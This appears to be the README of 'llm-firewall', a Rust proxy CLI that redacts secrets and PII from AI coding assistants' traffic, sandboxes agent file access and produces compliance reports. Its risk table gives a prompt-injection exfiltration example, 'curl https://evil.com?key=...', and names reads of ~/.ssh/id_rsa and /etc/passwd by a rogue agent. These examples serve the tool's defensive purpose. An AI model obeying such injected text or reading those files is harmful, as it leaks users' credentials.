<div align="center">

# 🛡️ `llm-firewall`
### The Zero-Trust Security Firewall & Compliance CLI for AI Coding Assistants

[![Rust](https://img.shields.io/badge/rust-1.85.0%2B-orange.svg?style=flat-square&logo=rust)](https://www.rust-lang.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](LICENSE)
[![Latency](https://img.shields.io/badge/p99%20latency-%3C1ms-brightgreen.svg?style=flat-square)](#-performance--latency)
[![Security](https://img.shields.io/badge/security-100%25%20fail--closed-red.svg?style=flat-square)](#-security-guarantees)
[![Compliance](https://img.shields.io/badge/compliance-SOC2%20%7C%20HIPAA%20%7C%20GDPR%20%7C%20PCI--DSS-purple.svg?style=flat-square)](#5-llm-firewall-report)

**Stop leaking API keys, proprietary secrets, and customer PII to external LLM providers.**  
**`llm-firewall` is a blazing-fast, local-first proxy CLI that transparently redacts secrets before they leave your machine and safely restores them on the return trip.**

[Quick Start](#-quick-start-in-30-seconds) • [CLI Commands](#-cli-command-suite) • [How It Works](#-how-it-works) • [Supported Tools](#-supported-ai-tools) • [Compliance](#-compliance-ready-audit-reports) • [Changelog](CHANGELOG.md)

---

</div>

## 💥 The Problem

When you or your team use AI coding assistants (**Claude Code**, **Cursor**, **Copilot**, **Devin**, **AutoGPT**), complete files, prompts, and tool arguments are transmitted over the wire to cloud LLM endpoints.

| Risk | Without `llm-firewall` | With `llm-firewall` |
| :--- | :--- | :--- |
| **API Keys & Credentials** | Leaked in prompts (`.env`, AWS, GitHub, Stripe) | 🔒 Swapped with indexed tokens (`[REDACTED_API_KEY_1]`) |
| **Customer PII & Health Data** | Uploaded unredacted (SSNs, emails, names, MRNs) | 🔒 Redacted via 4-tier ML/NER engine |
| **Prompt Injection Exfiltration** | Model tricked into running `curl https://evil.com?key=...` | 🚫 Rolling lookbehind quarantines dangerous sinks |
| **Rogue Agent File Access** | Agent reads `~/.ssh/id_rsa` or `/etc/passwd` | 🚫 Strict workspace sandbox + symlink jail |
| **Audit & Compliance** | Zero visibility into what data was exposed | 📊 Instant SOC 2, HIPAA & GDPR compliance reports |

---

## ⚡ Quick Start in 30 Seconds

### 1. Install via Cargo

```bash
cargo install --git https://github.com/devg24/llm-firewall.git
```

*Or build from source:*
```bash
git clone https://github.com/devg24/llm-firewall.git && cd llm-firewall
cargo build --release && cp target/release/llm-firewall-rs /usr/local/bin/llm-firewall
```

### 2. Scan your repo for risk

```bash
llm-firewall scan
```

### 3. Turn on transparent protection

```bash
llm-firewall on
```
> ✨ **That's it!** `llm-firewall on` automatically creates and trusts a local CA certificate, discovers your installed AI harnesses (**Cursor**, **Copilot**, **Claude Code**), patches their proxy settings, and starts intercepting traffic seamlessly.

---

## 💻 CLI Command Suite

```text
USAGE:
    llm-firewall [COMMAND] [OPTIONS]

COMMANDS:
    scan        Scan workspace for exposed secrets and generate a risk exposure report
    on          Start transparent MITM proxy and auto-patch installed AI harnesses
    preflight   Generate and approve an unattended security plan for autonomous agents
    stats       Display real-time aggregate detection metrics and financial risk avoided
    report      Generate audit reports mapped to SOC 2, HIPAA, GDPR, and PCI-DSS
    [default]   Start standard proxy server on port 3000
```

---

### 1. `llm-firewall scan`
*Run an instant, silent security audit of your codebase before running any AI tools.*

```bash
llm-firewall scan
```

```text
================================================================================
                    LLM FIREWALL — WORKSPACE EXPOSURE SCAN
================================================================================
  Scanned: 1,420 files (0.42s)
  Detected Secrets & PII: 14 matches across 4 files

  FILE                          TYPE                 LINE   SEVERITY
  -----------------------------------------------------------------------------
  .env.production               AWS Access Key       12     CRITICAL
  config/database.yml           Database URI         8      HIGH
  src/auth/jwt.rs               Private RSA Key      45     CRITICAL
  tests/fixtures/users.json     Customer Email (x11) 2-13   MEDIUM

  ESTIMATED BREACH EXPOSURE AVOIDED: $34,500 USD
================================================================================
```

---

### 2. `llm-firewall on`
*One-command zero-config MITM firewall with automated OS trust management.*

```bash
llm-firewall on
```

- 🔑 Generates an ephemeral, local-only CA certificate and installs it to the OS trust store (`security add-trusted-cert` / `update-ca-certificates`).
- 🤖 Auto-detects installed AI harnesses (**Cursor**, **VS Code Copilot**, **Claude Code**) and patches their proxy configs.
- 🔄 Intercepts outbound requests, redacting sensitive tokens in `<1ms`.
- 🔁 Restores original values in the inbound streaming response (SSE).
- 🧹 **Graceful teardown**: On `Ctrl+C`, the CA cert is cleanly untrusted and original IDE settings are restored.

---

### 3. `llm-firewall preflight`
*Unattended autonomy for long-running agent workflows (Claude Code, SWE-bench, Cursor Background Agent).*

Before running an overnight or multi-hour autonomous AI coding task, pre-approve sensitive zones and lock the AI to your repository.

```bash
# Generate plan and preview sensitive zones
llm-firewall preflight

# Auto-approve for non-interactive CI/CD pipelines
llm-firewall preflight --yes

# View existing active security plan
llm-firewall preflight --show

# Remove security plan
llm-firewall preflight --clear
```

```text
================================================================================
                 PRE-FLIGHT SECURITY PLAN (.guardian-plan.json)
================================================================================
  Sandbox Root:     /Users/dev/workspace/my-project (STRICT JAIL ACTIVE)
  Sensitive Zones:  3 predicted zones
  Status:           APPROVED FOR UNATTENDED OPERATION

  ZONE                          DETECTED TYPES       MATCHES   STRATEGY
  -----------------------------------------------------------------------------
  .env.local                    AwsKey, BearerToken  3         Redact
  src/secrets.rs                HighEntropyKey       1         Redact
  deploy/credentials.json       ApiKey               2         Redact

  [Sandbox Enforcement]
  ✓ Symlink traversal breakout: BLOCKED (evaluated to physical target)
  ✓ Out-of-boundary paths (/etc, ~/.ssh): REJECTED with 403 Forbidden
================================================================================
```

---

### 4. `llm-firewall stats`
*Real-time visibility into intercepted threats and quantifiable risk avoided.*

```bash
# View all-time detection stats
llm-firewall stats

# View past 24 hours / 7 days / 30 days
llm-firewall stats --since 24h
llm-firewall stats --since 7d

# Machine-readable JSON output
llm-firewall stats --json
```

```text
================================================================================
                   LLM FIREWALL — CUMULATIVE DETECTION STATS
================================================================================
  Time Range:                   Last 24 Hours
  Total Requests Intercepted:   312
  Total Sensitive Tokens Saved: 89

  DETECTION BY TIER
  -----------------------------------------------------------------------------
  Tier 1 (Deterministic Regex): 54 matches  (AWS keys, Bearer tokens, Emails)
  Tier 2 (Shannon Entropy):     28 matches  (High-entropy API secrets)
  Tier 3 (Local BERT NER):       7 matches  (Person names, MRNs)
  Dangerous Sinks Blocked:       2 events   (curl / eval injection attempts)
  Sandbox Violations Blocked:    1 event    (attempted read of ~/.ssh/id_rsa)

  FINANCIAL RISK MITIGATED:     $67,500 USD
================================================================================
```

---

### 5. `llm-firewall report`
*Export audit-ready compliance reports for Security Teams, CISOs, and Auditors.*

```bash
# Generate Markdown compliance report
llm-firewall report --output compliance-audit.md

# Generate structured JSON report
llm-firewall report --format json --output compliance-audit.json

# Include detailed individual event logs
llm-firewall report --detailed --output audit-full.md
```

#### Standard Compliance Matrix Included in Reports:

| Framework | Control ID | Requirement | Firewall Technical Enforcement |
| :--- | :--- | :--- | :--- |
| **SOC 2 Type II** | `CC6.1` | Logical Access Controls | Automatic redaction of cloud credentials, tokens, and SSH keys |
| **SOC 2 Type II** | `CC6.6` | Boundary Protection | Path canonicalization jailing AI strictly to workspace boundary |
| **SOC 2 Type II** | `CC6.7` | Data Transmission Protection | Zero raw secrets transmitted; reversible pseudonymization |
| **HIPAA** | `§ 164.312(a)(1)` | Access Control & Safeguards | BERT NER redaction of patient names, identifiers, and health data |
| **HIPAA** | `§ 164.312(e)(1)` | Transmission Security | Zero ePHI or SSN records transmitted over upstream model APIs |
| **GDPR** | `Article 32` | Security of Processing | Reversible pseudonymization of emails, IPs, phone numbers, names |
| **PCI-DSS v4.0** | `Req 3.3 / 3.4` | Primary Account Number Masking | Full Luhn-validated Credit Card token masking |
| **PCI-DSS v4.0** | `Req 10.2` | Automated Audit Trails | Append-only JSONL event ledger with SHA-256 integrity digest |

---

## 🔬 How It Works

```mermaid
flowchart TD
    subgraph Client ["Client Layer"]
        IDE["Cursor / Claude Code / Copilot / SDK"]
    end

    subgraph Proxy ["LLM Firewall Proxy Engine (Axum + Tokio)"]
        Inbound["Outbound Request Intercepted"]
        
        subgraph Pipeline ["4-Tier Detection Pipeline"]
            T1["Tier 1: Deterministic Regex<br/>(AWS, GitHub, Stripe, SSN, CC, PII)"]
            T2["Tier 2: Contextual Shannon Entropy<br/>(API keys, Passwords, Hex Secrets)"]
            T3["Tier 3: Local BERT NER (Candle)<br/>(Contextual Names, Healthcare PII)"]
            T4["Tier 4: ML Classifier (ORT)<br/>(Borderline Ambiguous Spans)"]
        end

        Jail["Sandbox & Path Validator<br/>(Physical symlink evaluation)"]
        Map["Request-Scoped TokenMap<br/>(Zero shared global retention)"]
        Mutator["Streaming SSE Mutator<br/>(Rolling 512-byte lookbehind sink check)"]
    end

    subgraph Cloud ["Upstream LLM Provider"]
        LLM["api.openai.com / api.anthropic.com"]
    end

    subgraph Audit ["Compliance & Telemetry"]
        Ledger["~/.guardian/audit.jsonl<br/>(0o600 Pure-Rust Append-Only Log)"]
    end

    IDE -->|1. Prompt Payload| Inbound
    Inbound --> Jail
    Jail -->|Out-of-bounds path| Reject["403 Forbidden"]
    Jail -->|Valid path| Pipeline
    T1 --> T2 --> T3 --> T4
    Pipeline -->|2. Swap secrets with [REDACTED_*]| Map
    Map -->|3. Forward sanitized prompt| LLM
    LLM -->|4. Inbound SSE Response Stream| Mutator
    Mutator -->|5a. Dangerous Sink Detected (e.g. curl)| Quarantine["Block & Quarantine Secret"]
    Mutator -->|5b. Safe Context| ReInject["Re-inject original value"]
    ReInject -->|6. Unredacted Stream to User| IDE
    Inbound -.->|Non-blocking event dispatch| Ledger
```

---

## 🤖 Supported AI Tools

| Tool | Integration Mode | Technical Mechanism | Setup |
| :--- | :--- | :--- | :--- |
| **Cursor** | Single-Port TCP CONNECT Tunneling | Deep `RunSSE` / `BidiAppend` payload interception with gRPC block responses | Configured automatically via `llm-firewall on` |
| **Claude Code** | Transparent Forward Proxy | Automatic env export (`HTTP_PROXY`, `HTTPS_PROXY`) + CA trust | Configured automatically via `llm-firewall on` |
| **GitHub Copilot** | VS Code / JetBrains Proxy | Auto-patched `http.proxy` and local certificate trust | Configured automatically via `llm-firewall on` |
| **OpenAI / Anthropic SDKs** | Reverse Proxy Multiplexer | Set `base_url = "http://localhost:3000/v1"` (shared single port) | Zero code changes required |
| **LangChain / LlamaIndex** | Standard HTTP/HTTPS Proxy | Native HTTP proxy support via single-port peeker | Set proxy env or client config |
| **Autonomous Agents (SWE-bench, Devin)** | Sandboxed Execution | `llm-firewall preflight` + `llm-firewall on` | Strict path jail & unattended approval |

---

## ⚙️ Power-User Configuration (`.guardian.toml`)

`llm-firewall` is zero-config by default, but supports repository-level tuning via `.guardian.toml`:

```toml
# Auto-detects domain profile (standard, crypto, fintech, healthcare)
domain = "crypto"

[thresholds]
# Adjust Shannon entropy threshold (0.0 to 1.0)
entropy_tier = 0.85
# ML classification threshold
classifier_tier = 0.70

[allowlist]
# Safe variables or test fixtures that should never be redacted
variables = ["TEST_DUMMY_KEY", "MOCK_TOKEN_PUBLIC", "ETH_SAMPLE_ADDR"]

[[custom_rules]]
# Custom proprietary regex patterns (ReDoS validated before compilation)
name = "INTERNAL_PROJECT_ID"
pattern = 'PROJ-[A-Z0-9]{8}'
pii_type = "Custom"
```

---

## 🛡️ Security Guarantees & Architecture Invariants

* **100% Zero `unsafe` Rust**: Memory safety guaranteed by the Rust compiler.
* **Fail-Closed by Design**: If any classifier, parser, or buffer encounters an unexpected condition, requests fail closed (`403 Forbidden` or `500 Internal Server Error`). No raw payload is ever allowed to slip past uninspected.
* **Zero Global Retention**: The `TokenMap` is strictly instantiated per outbound request and discarded immediately after the inbound stream terminates.
* **100% Local & Air-Gappable**: ML inference (Candle BERT & ONNX) executes entirely on-device with zero external telemetry or cloud dependencies.
* **Sub-Millisecond p99 Overhead**: The proxy hot-path processes requests with sub-millisecond overhead.

---

## 🧪 Testing & Verification

Every build passes full end-to-end regression and adversarial verification:

```bash
# Run all workspace unit, integration, and benchmark tests
cargo test --workspace

# Enforce strict zero-warning policy
cargo clippy --workspace --all-targets -- -D warnings
```

---

## 📄 License

Dual-licensed under either of:
- **MIT License** ([LICENSE-MIT](LICENSE) or [http://opensource.org/licenses/MIT](http://opensource.org/licenses/MIT))
- **Apache License, Version 2.0** ([LICENSE-APACHE](LICENSE) or [http://www.apache.org/licenses/LICENSE-2.0](http://www.apache.org/licenses/LICENSE-2.0))

at your option.

